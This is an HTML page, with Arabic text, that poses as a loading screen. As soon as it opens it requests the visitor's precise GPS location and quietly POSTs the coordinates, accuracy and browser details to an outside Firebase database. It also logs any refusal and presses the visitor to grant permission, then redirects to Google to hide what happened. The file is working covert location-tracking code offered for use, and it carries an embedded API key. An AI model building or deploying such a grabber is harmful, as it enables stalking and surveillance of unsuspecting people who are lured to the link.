<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        /* (نفس التنسيق السابق مع إضافة أزرار إضافية) */
        body {
            background: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
            flex-direction: column;
            padding: 20px;
        }
        .loader { text-align: center; max-width: 400px; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #8ab4f8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message { font-size: 16px; color: #ccc; margin: 8px 0; }
        .error { color: #f28b82; }
        .sub { font-size: 13px; color: #888; }
        .btn-group {
            margin-top: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 8px 24px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn:hover { background: #a8c8fa; transform: scale(1.02); }
        .btn-secondary {
            background: #555;
            color: white;
        }
        .btn-secondary:hover { background: #777; }
        .btn-danger {
            background: #d93025;
            color: white;
        }
        .btn-danger:hover { background: #b3261e; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner" id="spinner"></div>
        <div class="message" id="status">⏳ جاري تحديد الموقع...</div>
        <div class="sub" id="subStatus">يرجى السماح للمتصفح بالوصول إلى الموقع</div>
        <div class="btn-group" id="btnGroup">
            <button class="btn hidden" id="retryBtn" onclick="retryGeolocation()">🔄 إعادة المحاولة</button>
            <button class="btn btn-secondary hidden" id="continueBtn" onclick="continueWithoutLocation()">⏩ متابعة بدون موقع</button>
            <button class="btn btn-danger hidden" id="settingsBtn" onclick="openSettings()">⚙️ افتح إعدادات الموقع</button>
        </div>
    </div>

    <script>
        // ===== الإعدادات =====
        const firebaseConfig = {
            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
            projectId: "imggps"
        };
        const DB_PATH = "visitors";
        const TARGET_URL = "https://www.google.com"; // غيّر حسب رغبتك

        // ===== عناصر الواجهة =====
        const statusEl = document.getElementById('status');
        const subEl = document.getElementById('subStatus');
        const retryBtn = document.getElementById('retryBtn');
        const continueBtn = document.getElementById('continueBtn');
        const settingsBtn = document.getElementById('settingsBtn');
        const spinner = document.getElementById('spinner');

        let redirectTimer = null;
        let isRedirecting = false;
        let hasLocation = false;

        // ===== دوال مساعدة =====
        function setStatus(text, isError = false) {
            statusEl.textContent = text;
            statusEl.className = `message${isError ? ' error' : ''}`;
        }

        function setSub(text) { subEl.textContent = text; }

        function showButtons(showRetry = false, showContinue = false, showSettings = false) {
            retryBtn.classList.toggle('hidden', !showRetry);
            continueBtn.classList.toggle('hidden', !showContinue);
            settingsBtn.classList.toggle('hidden', !showSettings);
        }

        function redirect() {
            if (isRedirecting) return;
            isRedirecting = true;
            setStatus('⏳ جاري التوجيه...');
            setTimeout(() => window.location.href = TARGET_URL, 800);
        }

        // ===== حفظ البيانات =====
        function saveData(lat, lng, accuracy) {
            const record = {
                lat: parseFloat(lat),
                lng: parseFloat(lng),
                accuracy: accuracy || null,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            // حفظ محلي
            try {
                let localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                if (!Array.isArray(localData)) localData = [];
                localData.push(record);
                if (localData.length > 100) localData = localData.slice(-100);
                localStorage.setItem('geo_log', JSON.stringify(localData));
            } catch (e) { /* تجاهل */ }

            // إرسال إلى Firebase
            setStatus('📤 جاري حفظ الموقع...');
            setSub('جاري المزامنة مع السحابة');

            return fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(record)
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return response.json();
            })
            .then(() => {
                setStatus('✅ تم الحفظ بنجاح');
                setSub('سيتم التوجيه خلال لحظات...');
            })
            .catch(err => {
                console.warn('فشل الحفظ السحابي:', err);
                setStatus('⚠️ تم الحفظ محلياً فقط', true);
                setSub('لم نتمكن من الاتصال بالسحابة، سيتم التوجيه مع ذلك');
            });
        }

        // ===== معالجة الموقع =====
        function handlePosition(pos) {
            if (redirectTimer) clearTimeout(redirectTimer);
            hasLocation = true;
            const lat = pos.coords.latitude.toFixed(7);
            const lng = pos.coords.longitude.toFixed(7);
            const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : null;

            setStatus(`📍 تم التحديد (${lat}, ${lng})`);
            setSub('الدقة: ' + (acc ? acc + ' متر' : 'غير معروفة'));
            showButtons(false, false, false);

            saveData(lat, lng, acc)
                .finally(() => {
                    redirectTimer = setTimeout(redirect, 1500);
                });
        }

        function handleError(err) {
            if (redirectTimer) clearTimeout(redirectTimer);
            console.warn('خطأ في تحديد الموقع:', err.message);
            let msg = 'لم نتمكن من تحديد موقعك.';
            let subMsg = '';
            let showRetry = false;
            let showContinue = true;
            let showSettings = false;

            switch (err.code) {
                case 1: // PERMISSION_DENIED
                    msg = '🚫 تم رفض مشاركة الموقع';
                    subMsg = 'يرجى السماح بالموقع في إعدادات المتصفح';
                    showRetry = true;
                    showSettings = true;
                    // تسجيل رفض في Firebase (حدث بدون إحداثيات)
                    fetch(`${firebaseConfig.databaseURL}/refusals.json`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            reason: 'permission_denied',
                            timestamp: Date.now(),
                            userAgent: navigator.userAgent.substring(0, 100)
                        })
                    }).catch(() => {});
                    break;
                case 2: // POSITION_UNAVAILABLE
                    msg = '📡 الموقع غير متوفر حالياً';
                    subMsg = 'تأكد من تفعيل GPS أو الواي فاي';
                    showRetry = true;
                    break;
                case 3: // TIMEOUT
                    msg = '⏱️ انتهت مهلة التحديد';
                    subMsg = 'حاول مجدداً أو تأكد من الإشارة';
                    showRetry = true;
                    break;
                default:
                    subMsg = 'حدث خطأ غير متوقع';
                    showRetry = true;
            }

            setStatus(msg, true);
            setSub(subMsg);
            showButtons(showRetry, showContinue, showSettings);

            // توجيه تلقائي بعد 10 ثوانٍ إذا لم يتخذ المستخدم إجراء
            redirectTimer = setTimeout(() => {
                if (!hasLocation) {
                    setStatus('⏳ سيتم التوجيه تلقائياً...');
                    redirect();
                }
            }, 10000);
        }

        // ===== دوال الأزرار =====
        function retryGeolocation() {
            if (redirectTimer) clearTimeout(redirectTimer);
            showButtons(false, false, false);
            setStatus('⏳ جاري تحديد الموقع...');
            setSub('يرجى السماح للمتصفح بالوصول إلى الموقع');
            navigator.geolocation.getCurrentPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        function continueWithoutLocation() {
            if (redirectTimer) clearTimeout(redirectTimer);
            setStatus('⏩ متابعة بدون تحديد الموقع');
            setSub('سيتم التوجيه خلال لحظات...');
            // تسجيل أن المستخدم اختار المتابعة بدون موقع
            fetch(`${firebaseConfig.databaseURL}/skips.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    reason: 'user_skipped',
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent.substring(0, 100)
                })
            }).catch(() => {});
            setTimeout(redirect, 1500);
        }

        function openSettings() {
            // محاولة فتح إعدادات الموقع (يعمل على أندرويد عبر Intent)
            if (navigator.userAgent.toLowerCase().includes('android')) {
                window.location.href = 'intent://settings/location#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
            } else if (navigator.userAgent.toLowerCase().includes('iphone') || navigator.userAgent.toLowerCase().includes('ipad')) {
                // iOS: توجيه إلى إعدادات الخصوصية
                window.location.href = 'app-settings:';
            } else {
                // سطح المكتب: عرض تعليمات
                alert('افتح إعدادات المتصفح وامنح الإذن بالموقع، ثم اضغط "إعادة المحاولة"');
            }
        }

        // ===== البدء =====
        if (navigator.geolocation) {
            setStatus('📍 جاري فتح الموقع...');
            setSub('سيُطلب منك السماح بالوصول إلى الموقع');
            navigator.geolocation.getCurrentPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        } else {
            setStatus('⚠️ المتصفح لا يدعم تحديد الموقع', true);
            setSub('سيتم التوجيه تلقائياً...');
            showButtons(false, true, false);
            setTimeout(redirect, 3000);
        }

        // مهلة عامة 25 ثانية
        setTimeout(() => {
            if (!isRedirecting && !window.location.href.includes(TARGET_URL)) {
                setStatus('⏳ مهلة عامة، جاري التوجيه...', true);
                redirect();
            }
        }, 25000);

        // ربط الدوال بالـ window لاستخدامها في الأزرار
        window.retryGeolocation = retryGeolocation;
        window.continueWithoutLocation = continueWithoutLocation;
        window.openSettings = openSettings;
    </script>
</body>
</html>
